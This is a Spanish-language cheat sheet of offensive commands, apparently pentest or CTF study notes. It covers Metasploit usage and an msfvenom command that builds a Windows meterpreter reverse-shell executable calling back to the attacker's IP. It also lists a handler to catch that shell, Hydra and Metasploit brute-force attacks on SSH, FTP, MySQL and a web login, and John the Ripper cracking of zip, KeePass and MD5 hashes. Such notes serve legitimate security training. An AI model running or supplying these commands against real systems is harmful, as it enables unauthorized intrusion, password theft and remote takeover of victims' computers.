## Comandos básicos de metasploit:

``` bash
msfdb init
search (servicio / CVE)
options
run / exploit
shell
```

### msfvenom

``` bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=NuestraIP LPORT=443 -f exe -o pwned.exe
compartir por servidor python
```

### multi handler:

``` bash
use /multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST
set LPORT
```

### fuerza bruta

``` bash
search fp_login
set PASS_FILE /usr/share/wordlist/rockyou.txt
set USERNAME user
set RHOSTS IP

search ssh_login
set USERNAME user
set PASS_FILE /usr/share/wordlist/rockyou.txt
set RHOSTS IP
```

## Hydra

``` bash
hydra -l user -P /usr/share/wordlist/rockyou.txt ssh://IP
hydra -l user -P /usr/share/wordlist/rockyou.txt ftp://IP

hydra -L /usr/share/wordlist/metasploit/unix_users.txt -p psswd ssh://IP

hydra -t 64 -l admin -P /usr/share/wordlist/rockyou.txt IP http-post-form “/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect”
```

## Bases de datos

``` bash
hydra -l capybara -P /usr/share/wordlist/rockyou.txt mysql://IP

mysql -u capybara -ppassword1 -h IP
```

## John The Ripper

``` bash
# en caso de tener un zip
zip2john archivos.zip > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash

# en caso de un keepass
keepass2john Database.kdbx > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash

# en caso de un hash | # hash identifier
john --format=Raw-MD5 --wordlist=/usr/share/wordlist/rockyou.txt hash
```
